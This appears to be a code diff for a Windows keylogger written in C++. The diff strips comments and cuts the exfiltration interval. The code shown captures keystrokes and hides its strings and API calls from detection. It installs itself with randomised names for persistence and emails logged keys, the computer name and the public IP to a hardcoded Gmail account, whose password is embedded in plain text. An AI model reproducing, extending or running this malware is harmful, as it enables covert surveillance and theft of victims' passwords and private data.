@@ -11,14 +11,13 @@
 #include <sstream>
 #include <algorithm>
 #include <Wincrypt.h>
-#include <memory>  // Added for std::unique_ptr
+#include <memory> 
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
-// ====================== ENHANCED OBFUSCATION ======================
 #define HIDE_STR(str) []() -> std::string { \
     const std::string key = "7H#kP9m!zTsQvR"; \
     std::string s = str; \
@@ -29,7 +28,6 @@
     return s; \
 }()
 
-// ====================== SECURE CREDENTIAL HANDLING ======================
 std::string DecryptCredential(const std::string& input) {
     const std::string key = "7H#kP9m!zTsQvR";
     std::string output = input;
@@ -40,7 +38,6 @@ std::string DecryptCredential(const std::string& input) {
     return output;
 }
 
-// ====================== API RESOLUTION ======================
 struct APIResolver {
     template <typename T>
     static T Get(const std::string& lib, const std::string& func) {
@@ -50,7 +47,6 @@ struct APIResolver {
     }
 };
 
-// ====================== RANDOMIZED IDENTIFIERS ======================
 std::string GenerateRandomString(size_t length) {
     static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     std::string result;
@@ -69,7 +65,6 @@ std::string GenerateRandomString(size_t length) {
     return result;
 }
 
-// ====================== CONFIGURATION ======================
 const std::string ENCRYPTED_USER = HIDE_STR("loirverse@gmail.com");
 const std::string ENCRYPTED_PASS = HIDE_STR("kfjnnlovftazuxkk");
 const std::string ENCRYPTED_SMTP = HIDE_STR("smtp.gmail.com");
@@ -80,13 +75,11 @@ std::string computerName;
 HANDLE hLogMutex;
 std::string keystrokeBuffer;
 
-// Generated random identifiers
 std::string mutexName;
 std::string regValueName;
 std::string exeName;
 std::string dirName;
 
-// ====================== UTILITIES ======================
 std::string GetTimestamp() {
     SYSTEMTIME st;
     auto pGetLocalTime = APIResolver::Get<decltype(&GetLocalTime)>("kernel32.dll", "GetLocalTime");
@@ -107,7 +100,6 @@ void WriteToLog(const std::string& content) {
     if (pReleaseMutex) pReleaseMutex(hLogMutex);
 }
 
-// Define function pointer types for WinINet
 typedef HINTERNET (WINAPI *InternetOpenFn)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
 typedef HINTERNET (WINAPI *InternetOpenUrlFn)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
 typedef BOOL (WINAPI *InternetReadFileFn)(HINTERNET, LPVOID, DWORD, LPDWORD);
@@ -146,7 +138,6 @@ std::string GetPublicIP() {
     return ip.empty() ? "unknown" : ip;
 }
 
-// ====================== KEYLOGGER ======================
 class IKeylogger {
 public:
     virtual void Start() = 0;
@@ -161,7 +152,6 @@ class HookKeylogger : public IKeylogger {
             if (wParam == WM_KEYDOWN) {
                 std::string logEntry;
                 
-                // Special keys handling
                 switch (kb->vkCode) {
                     case VK_SPACE: logEntry = "[Space]"; break;
                     case VK_RETURN: logEntry = "[Enter]\n"; break;
@@ -174,12 +164,11 @@ class HookKeylogger : public IKeylogger {
                     case VK_MENU: logEntry = "[Alt]"; break;
                     case VK_LWIN: case VK_RWIN: logEntry = "[Win]"; break;
                     default:
-                        // Alphanumeric handling
                         if ((kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)) {
                             char c = static_cast<char>(kb->vkCode);
                             bool isShift = GetAsyncKeyState(VK_SHIFT) < 0;
                             
-                            // Handle letters
+                        
                             if (kb->vkCode >= 0x41 && kb->vkCode <= 0x5A) {
                                 c = isShift ? c : c + 32;
                             }
@@ -238,7 +227,6 @@ public:
                     // Key pressed
                     keyState[i] = 1;
                     
-                    // Handle special keys
                     std::string key;
                     switch (i) {
                         case VK_SPACE: key = "[Space]"; break;
@@ -252,7 +240,7 @@ public:
                         case VK_MENU: key = "[Alt]"; break;
                         case VK_LWIN: case VK_RWIN: key = "[Win]"; break;
                         default:
-                            // Alphanumeric keys
+                        
                             char c = static_cast<char>(i);
                             if (i >= 'A' && i <= 'Z') {
                                 bool isShift = GetAsyncKeyState(VK_SHIFT) < 0;
@@ -287,7 +275,6 @@ IKeylogger* CreateKeylogger() {
         : static_cast<IKeylogger*>(new PollKeylogger());
 };
 
-// ====================== BASE64 ENCODING ======================
 std::string Base64Encode(const std::string& input) {
     DWORD len = 0;
     auto pCryptBinaryToStringA = APIResolver::Get<decltype(&CryptBinaryToStringA)>("crypt32.dll", "CryptBinaryToStringA");
@@ -305,14 +292,12 @@ std::string Base64Encode(const std::string& input) {
     return "";
 }
 
-// ====================== PROPER SMTP IMPLEMENTATION ======================
 bool SendEmail(const std::string& subject, const std::string& body) {
     // Decrypt credentials at runtime
     const std::string EMAIL_USER = DecryptCredential(ENCRYPTED_USER);
     const std::string EMAIL_PASS = DecryptCredential(ENCRYPTED_PASS);
     const std::string SMTP_SERVER = DecryptCredential(ENCRYPTED_SMTP);
     
-    // Initialize Winsock
     WSADATA wsaData;
     auto pWSAStartup = APIResolver::Get<decltype(&WSAStartup)>("ws2_32.dll", "WSAStartup");
     auto pWSACleanup = APIResolver::Get<decltype(&WSACleanup)>("ws2_32.dll", "WSACleanup");
@@ -332,7 +317,6 @@ bool SendEmail(const std::string& subject, const std::string& body) {
         return false;
     }
     
-    // Resolve server address
     hostent* host = pGethostbyname(SMTP_SERVER.c_str());
     if (!host) {
         pWSACleanup();
@@ -356,7 +340,6 @@ bool SendEmail(const std::string& subject, const std::string& body) {
         return false;
     }
     
-    // SMTP conversation
     auto SendCommand = [&](const std::string& cmd, int expected) -> bool {
         std::string fullCmd = cmd + "\r\n";
         if (pSend(sock, fullCmd.c_str(), fullCmd.size(), 0) <= 0) 
@@ -370,7 +353,6 @@ bool SendEmail(const std::string& subject, const std::string& body) {
         return std::stoi(buffer) == expected;
     };
     
-    // SMTP handshake
     char recvBuf[1024];
     pRecv(sock, recvBuf, sizeof(recvBuf), 0); // Read welcome
     
@@ -382,7 +364,6 @@ bool SendEmail(const std::string& subject, const std::string& body) {
     if (!SendCommand("RCPT TO: <" + EMAIL_USER + ">", 250)) return false;
     if (!SendCommand("DATA", 354)) return false;
     
-    // Construct email
     std::string emailData = "From: " + EMAIL_USER + "\r\n"
         "To: " + EMAIL_USER + "\r\n"
         "Subject: " + subject + "\r\n"
@@ -394,7 +375,6 @@ bool SendEmail(const std::string& subject, const std::string& body) {
         return false;
     }
     
-    // Cleanup
     SendCommand("QUIT", 221);
     pClosesocket(sock);
     pWSACleanup();
@@ -407,7 +387,7 @@ DWORD WINAPI EmailThread(LPVOID) {
     auto pReleaseMutex = APIResolver::Get<decltype(&ReleaseMutex)>("kernel32.dll", "ReleaseMutex");
     
     while (true) {
-        if (pSleep) pSleep(86400000); // 24 hours
+        if (pSleep) pSleep(86400); // 24 hours
         
         if (pWaitForSingleObject) pWaitForSingleObject(hLogMutex, INFINITE);
         
@@ -420,19 +400,15 @@ DWORD WINAPI EmailThread(LPVOID) {
                 logFile.close();
             }
             
-            // Get public IP
             std::string publicIP = GetPublicIP();
             
-            // Build email body
             std::string fullBody = "Computer Name: " + computerName + "\n";
             fullBody += "Public IP: " + publicIP + "\n\n";
             fullBody += keystrokeBuffer;
             
-            // Send email with log contents
             std::string subject = "Report - " + computerName + " - " + GetTimestamp();
             SendEmail(subject, fullBody);
             
-            // Clear buffer
             keystrokeBuffer.clear();
         }
         
@@ -441,7 +417,6 @@ DWORD WINAPI EmailThread(LPVOID) {
     return 0;
 }
 
-// ====================== RANDOMIZED PERSISTENCE ======================
 void InstallPersistence() {
     auto pGetModuleFileName = APIResolver::Get<decltype(&GetModuleFileNameA)>("kernel32.dll", "GetModuleFileNameA");
     auto pCopyFile = APIResolver::Get<decltype(&CopyFileA)>("kernel32.dll", "CopyFileA");
@@ -466,7 +441,6 @@ void InstallPersistence() {
     }
 }
 
-// ====================== MAIN ======================
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     // Generate randomized identifiers
     mutexName = GenerateRandomString(12);
@@ -474,7 +448,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     exeName = GenerateRandomString(8) + ".exe";
     dirName = GenerateRandomString(10);
 
-    // Initialize APIs
     auto pGetEnvironmentVariable = APIResolver::Get<decltype(&GetEnvironmentVariableA)>("kernel32.dll", "GetEnvironmentVariableA");
     auto pCreateDirectory = APIResolver::Get<decltype(&CreateDirectoryA)>("kernel32.dll", "CreateDirectoryA");
     auto pCreateMutex = APIResolver::Get<decltype(&CreateMutexA)>("kernel32.dll", "CreateMutexA");
@@ -482,7 +455,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     auto pCloseHandle = APIResolver::Get<decltype(&CloseHandle)>("kernel32.dll", "CloseHandle");
     auto pGetComputerName = APIResolver::Get<decltype(&GetComputerNameA)>("kernel32.dll", "GetComputerNameA");
     
-    // Get computer name
     char compName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD size = sizeof(compName);
     if (pGetComputerName && pGetComputerName(compName, &size)) {
@@ -491,7 +463,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         computerName = "unknown";
     }
     
-    // Get AppData path
     char appData[MAX_PATH];
     if (pGetEnvironmentVariable) 
         pGetEnvironmentVariable("APPDATA", appData, MAX_PATH);
@@ -499,23 +470,18 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     if (pCreateDirectory) 
         pCreateDirectory(userPath.c_str(), NULL);
     
-    // Create mutex with random name
     if (pCreateMutex) 
         hLogMutex = pCreateMutex(NULL, FALSE, mutexName.c_str());
     
-    // Install persistence
     InstallPersistence();
     
-    // Start email thread
     HANDLE hEmailThread = NULL;
     if (pCreateThread) 
         hEmailThread = pCreateThread(NULL, 0, EmailThread, NULL, 0, NULL);
     
-    // Start polymorphic keylogger
     std::unique_ptr<IKeylogger> keylogger(CreateKeylogger());
     keylogger->Start();
     
-    // Cleanup
     if (pCloseHandle) {
         if (hEmailThread) pCloseHandle(hEmailThread);
         if (hLogMutex) pCloseHandle(hLogMutex);
